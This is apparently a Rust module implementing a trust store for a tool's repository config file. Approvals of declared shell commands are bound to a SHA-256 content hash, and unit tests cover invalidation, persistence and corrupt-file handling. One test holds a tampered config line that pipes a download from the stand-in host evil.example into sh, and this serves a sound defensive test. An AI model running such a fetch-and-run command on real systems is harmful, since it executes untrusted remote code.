//! The trust store.
//!
//! # The threat
//!
//! A `wtm.toml` declares shell commands, and it lives inside a repository. Without a
//! gate, cloning an unfamiliar repo and opening it in wtm is equivalent to running its
//! code — a `[setup]` block is arbitrary execution, and a `[[field]]` with a
//! command-backed dropdown runs *while you are typing*.
//!
//! # The gate
//!
//! Approval is bound to a **content hash**, not to a path. Approving
//! `/repo/wtm.toml` approves those exact bytes; editing the file — whether by you, a
//! `git pull`, or a branch switch — invalidates it and the prompt returns. A
//! path-keyed store would be approve-once-run-anything-later, which is no gate at all.
//!
//! Rejections are remembered too, so declining does not mean being asked again on
//! every refresh.
//!
//! This is the model `direnv` and VS Code workspace trust use. It shipped in the first
//! version rather than being deferred, because a security control added later is one
//! that was absent for the whole interesting period.

use std::collections::BTreeMap;
use std::path::Path;

use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};
use wtm_core::error::ConfigError;
use wtm_core::ports::config::TrustDecision;

/// What was decided about one file's content.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Verdict {
    Approved,
    Rejected,
}

/// A recorded decision.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TrustRecord {
    /// Hex SHA-256 of the file's exact contents.
    pub content_hash: String,
    pub verdict: Verdict,
    /// When it was decided, for display. Never used to expire anything — an approval
    /// is invalidated by the content changing, not by time.
    #[serde(default)]
    pub decided_at: Option<String>,
}

/// Persisted decisions, keyed by absolute path.
///
/// Keyed by path *and* checked against the hash: the path finds the record, the hash
/// decides whether it still applies.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct TrustStore {
    #[serde(default)]
    pub entries: BTreeMap<String, TrustRecord>,
}

/// Hex SHA-256 of `contents`.
#[must_use]
pub fn content_hash(contents: &str) -> String {
    let digest = Sha256::digest(contents.as_bytes());
    // Hex rather than base64: it is what a user would get from `shasum -a 256`, so a
    // suspicious value is verifiable by hand.
    digest
        .iter()
        .fold(String::with_capacity(64), |mut out, byte| {
            use std::fmt::Write;
            let _ = write!(out, "{byte:02x}");
            out
        })
}

impl TrustStore {
    /// Load from disk, treating a missing or corrupt file as empty.
    ///
    /// Corrupt-is-empty is the safe direction: forgetting approvals costs a prompt,
    /// while failing open would run unreviewed commands, and refusing to start would
    /// make a stray byte brick the app.
    pub fn load(path: &Path) -> Self {
        match std::fs::read_to_string(path) {
            Ok(text) => toml::from_str(&text).unwrap_or_else(|e| {
                tracing::warn!(path = %path.display(), error = %e, "trust store unreadable; treating as empty");
                Self::default()
            }),
            Err(_) => Self::default(),
        }
    }

    /// Write atomically: a temporary file in the same directory, then a rename.
    ///
    /// A half-written trust store would be indistinguishable from a corrupt one, and
    /// the recovery for corrupt is "forget every approval".
    pub fn save(&self, path: &Path) -> Result<(), ConfigError> {
        let io = |e: &std::io::Error| ConfigError::Io {
            path: path.to_path_buf(),
            message: e.to_string(),
        };

        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent).map_err(|e| io(&e))?;
        }

        let text = toml::to_string_pretty(self).map_err(|e| ConfigError::Io {
            path: path.to_path_buf(),
            message: format!("serialize trust store: {e}"),
        })?;

        // Same directory, so the rename stays within one filesystem and is atomic.
        let temporary = path.with_extension("toml.tmp");
        std::fs::write(&temporary, text).map_err(|e| io(&e))?;
        std::fs::rename(&temporary, path).map_err(|e| io(&e))
    }

    /// The verdict for these exact contents, if one was recorded.
    ///
    /// Returns `None` when the file is unknown *or* when its contents have changed
    /// since the decision — both mean "ask".
    #[must_use]
    pub fn verdict_for(&self, path: &Path, contents: &str) -> Option<Verdict> {
        let record = self.entries.get(&key_for(path))?;
        (record.content_hash == content_hash(contents)).then_some(record.verdict)
    }

    #[must_use]
    pub fn is_approved(&self, path: &Path, contents: &str) -> bool {
        self.verdict_for(path, contents) == Some(Verdict::Approved)
    }

    /// Record a decision for these exact contents, replacing any earlier one.
    pub fn record(
        &mut self,
        path: &Path,
        contents: &str,
        decision: TrustDecision,
        decided_at: Option<String>,
    ) {
        let verdict = match decision {
            TrustDecision::Approve => Verdict::Approved,
            TrustDecision::Reject => Verdict::Rejected,
        };
        self.entries.insert(
            key_for(path),
            TrustRecord {
                content_hash: content_hash(contents),
                verdict,
                decided_at,
            },
        );
    }

    /// Forget a path entirely, so the next load re-prompts.
    pub fn forget(&mut self, path: &Path) {
        self.entries.remove(&key_for(path));
    }
}

fn key_for(path: &Path) -> String {
    path.to_string_lossy().into_owned()
}

#[cfg(test)]
mod tests {
    use super::*;

    const CONFIG: &str = "[setup]\nrun = ['./bin/setup.sh']\n";

    fn store_with_approval(path: &Path, contents: &str) -> TrustStore {
        let mut store = TrustStore::default();
        store.record(path, contents, TrustDecision::Approve, None);
        store
    }

    #[test]
    fn an_unknown_file_has_no_verdict() {
        let store = TrustStore::default();
        assert_eq!(store.verdict_for(Path::new("/r/wtm.toml"), CONFIG), None);
        assert!(!store.is_approved(Path::new("/r/wtm.toml"), CONFIG));
    }

    #[test]
    fn approval_applies_to_the_exact_contents() {
        let path = Path::new("/r/wtm.toml");
        let store = store_with_approval(path, CONFIG);
        assert!(store.is_approved(path, CONFIG));
    }

    /// The property the whole design rests on.
    #[test]
    fn editing_the_file_invalidates_approval() {
        let path = Path::new("/r/wtm.toml");
        let store = store_with_approval(path, CONFIG);

        let tampered = "[setup]\nrun = ['curl', 'evil.example', '|', 'sh']\n";
        assert!(
            !store.is_approved(path, tampered),
            "a changed command must not inherit the old approval"
        );
        assert_eq!(
            store.verdict_for(path, tampered),
            None,
            "and it must read as unknown, so the prompt returns"
        );
    }

    #[test]
    fn even_a_whitespace_change_invalidates_approval() {
        // Erring toward re-asking: distinguishing "cosmetic" from "meaningful" edits
        // would mean parsing, and a parser bug would become a security hole.
        let path = Path::new("/r/wtm.toml");
        let store = store_with_approval(path, CONFIG);
        assert!(!store.is_approved(path, &format!("{CONFIG}\n")));
    }

    #[test]
    fn rejection_is_remembered_so_the_prompt_does_not_repeat() {
        let path = Path::new("/r/wtm.toml");
        let mut store = TrustStore::default();
        store.record(path, CONFIG, TrustDecision::Reject, None);

        assert_eq!(store.verdict_for(path, CONFIG), Some(Verdict::Rejected));
        assert!(!store.is_approved(path, CONFIG));
    }

    #[test]
    fn a_later_decision_replaces_an_earlier_one() {
        let path = Path::new("/r/wtm.toml");
        let mut store = TrustStore::default();
        store.record(path, CONFIG, TrustDecision::Reject, None);
        store.record(path, CONFIG, TrustDecision::Approve, None);
        assert!(store.is_approved(path, CONFIG));
        assert_eq!(store.entries.len(), 1, "must not accumulate duplicates");
    }

    #[test]
    fn approvals_are_per_path() {
        let a = Path::new("/repo-a/wtm.toml");
        let b = Path::new("/repo-b/wtm.toml");
        let store = store_with_approval(a, CONFIG);
        assert!(store.is_approved(a, CONFIG));
        assert!(
            !store.is_approved(b, CONFIG),
            "identical contents in another repo is still a separate decision"
        );
    }

    #[test]
    fn forget_restores_the_prompt() {
        let path = Path::new("/r/wtm.toml");
        let mut store = store_with_approval(path, CONFIG);
        store.forget(path);
        assert_eq!(store.verdict_for(path, CONFIG), None);
    }

    #[test]
    fn hashes_are_stable_hex_and_differ_by_content() {
        let hash = content_hash(CONFIG);
        assert_eq!(hash.len(), 64, "SHA-256 as hex");
        assert!(hash.chars().all(|c| c.is_ascii_hexdigit()));
        assert_eq!(hash, content_hash(CONFIG), "must be deterministic");
        assert_ne!(hash, content_hash("other"));
        // Verifiable by hand against `shasum -a 256`.
        assert_eq!(
            content_hash(""),
            "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        );
    }

    #[test]
    fn round_trips_through_disk() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("trust.toml");
        let config_path = Path::new("/r/wtm.toml");

        let mut store = TrustStore::default();
        store.record(
            config_path,
            CONFIG,
            TrustDecision::Approve,
            Some("2026-07-28".to_owned()),
        );
        store.save(&file).unwrap();

        let reloaded = TrustStore::load(&file);
        assert!(reloaded.is_approved(config_path, CONFIG));
        assert!(!reloaded.is_approved(config_path, "changed"));
    }

    #[test]
    fn save_creates_missing_parent_directories() {
        let dir = tempfile::tempdir().unwrap();
        let nested = dir.path().join("a/b/c/trust.toml");
        TrustStore::default().save(&nested).unwrap();
        assert!(nested.exists());
    }

    #[test]
    fn save_leaves_no_temporary_file_behind() {
        let dir = tempfile::tempdir().unwrap();
        let file = dir.path().join("trust.toml");
        TrustStore::default().save(&file).unwrap();
        assert!(!dir.path().join("trust.toml.tmp").exists());
    }

    #[test]
    fn a_missing_or_corrupt_store_loads_as_empty_rather_than_failing() {
        let dir = tempfile::tempdir().unwrap();
        assert!(
            TrustStore::load(&dir.path().join("absent.toml"))
                .entries
                .is_empty()
        );

        let corrupt = dir.path().join("corrupt.toml");
        std::fs::write(&corrupt, "this is not { valid toml").unwrap();
        assert!(
            TrustStore::load(&corrupt).entries.is_empty(),
            "corrupt must mean forget approvals, never fail open"
        );
    }
}
